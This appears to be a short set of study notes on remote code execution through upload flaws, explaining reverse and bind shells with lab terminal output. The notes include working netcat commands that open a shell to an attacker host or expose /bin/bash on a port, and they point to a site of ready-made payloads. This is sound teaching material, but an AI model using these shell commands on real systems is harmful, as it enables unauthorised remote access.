# [Introduction]()

Remote Code Execution (as the name suggests) would allow us to execute code arbitrarily on the web server. Whilst this is likely to be as a low-privileged web user account (such as `www-data` on Linux servers), it's still an extremely serious vulnerability. Remote code execution via an upload vulnerability in a web application tends to be exploited by uploading a program written in the same language as the back-end of the website (or another language which the server understands and will execute). For payloads check [this](https://www.revshells.com/) website.

## [Reverse shell]()

![](Pasted%20image%2020241205154510.png)

In this case attacker listens/open port on attack machine and trick target machine to connect to attacker using specific payload. Payloads can be found on [revshells](https://www.revshells.com/). This is generally used in CTFs/internal networks.

Step 1: Attacker listens for a port. 
```
┌──[attacker@linux]─[~]
└──╼ $ nc -nlvp 9999
listening on [any] 9999 ...
connect to [192.168.122.60] from (UNKNOWN) [192.168.122.2] 54524
whoami
target
```

Step 2: Target connects to attacker port and give access to execute `/bin/bash`(payload is `nc 192.168.122.60 9999 -e /bin/bash` in this case.)
```
┌──[target@linux]─[~]
└──╼ $ nc 192.168.122.60 9999 -e /bin/bash

```

## [Bind shell]()

![](Pasted%20image%2020241205154852.png)

In this case attacker connect to target server which is listening on specific port. This is generally used in **external networks** because this does not requires port forwarding for external networks (as compared to revshell which requires config the router to forward external port to internal port.)

Step 1: Target listens on specific port and allows connected host to access `/bin/bash`
```
┌──[target@linux]─[~]
└──╼ $ nc -nlvp 9999 -e /bin/bash
listening on [any] 9999 ...
connect to [192.168.122.2] from (UNKNOWN) [192.168.122.60] 57644

```

Step 2: Attacker connects to target.
```
┌──[attacker@linux]─[~]
└──╼ $ nc 192.168.122.2 9999
whoami
target
```
